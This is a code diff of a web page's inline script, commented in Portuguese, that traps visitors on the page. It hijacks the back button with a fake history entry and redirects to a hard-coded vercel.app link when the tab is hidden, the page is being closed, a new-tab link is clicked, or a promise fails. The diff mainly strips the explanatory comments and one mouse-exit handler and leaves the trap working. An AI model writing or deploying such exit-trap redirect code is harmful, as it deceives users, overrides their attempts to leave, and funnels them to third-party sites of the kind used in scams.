@@ -1436,46 +1436,36 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     </script>
     
    <script>
-  const redirectUrl = "https://previasmcmirella.vercel.app/"; // 🔁 Troca pelo link do teu bot/grupo
+  const redirectUrl = "https://previasmcmirella.vercel.app/";
 
-  // 1. Cria um histórico falso pro botão "voltar" do navegador
   history.pushState(null, null, location.href);
-  window.addEventListener("popstate", function () {
+  window.addEventListener("popstate", () => {
     location.href = redirectUrl;
   });
 
-  // 2. Detecta tentativa de fechar/ir embora no desktop (move o mouse pro topo)
-  document.addEventListener("mouseout", function (e) {
-    if (!e.toElement && !e.relatedTarget && e.clientY < 10) {
-      location.href = redirectUrl;
-    }
-  });
-
-  // 3. Detecta quando o usuário tenta sair da aba ou minimizar no celular/PC
-  document.addEventListener("visibilitychange", function () {
+  document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "hidden") {
       location.href = redirectUrl;
     }
   });
 
-  // 4. Detecta tentativa de fechar usando gesto/swipe (mobile)
-  window.addEventListener("beforeunload", function (e) {
+  window.addEventListener("beforeunload", (e) => {
     e.preventDefault();
     e.returnValue = '';
+    // Navegação pelo navegador ou fechar aba
     location.href = redirectUrl;
   });
 
-  // 5. Garante que QUALQUER clique em links externos também vá pro redirecionamento
-  document.querySelectorAll("a").forEach(link => {
-    link.addEventListener("click", function (e) {
-      if (this.target === "_blank") {
-        e.preventDefault();
-        location.href = redirectUrl;
-      }
+  document.querySelectorAll("a[target='_blank']").forEach(link => {
+    link.addEventListener("click", (e) => {
+      e.preventDefault();
+      location.href = redirectUrl;
     });
   });
+
+  // Pop-up extra ao tentar fechar/navegar no botão fechar
+  window.addEventListener("unhandledrejection", () => {
+    // fallback
+    location.href = redirectUrl;
+  });
 </script>
-
-
-
-
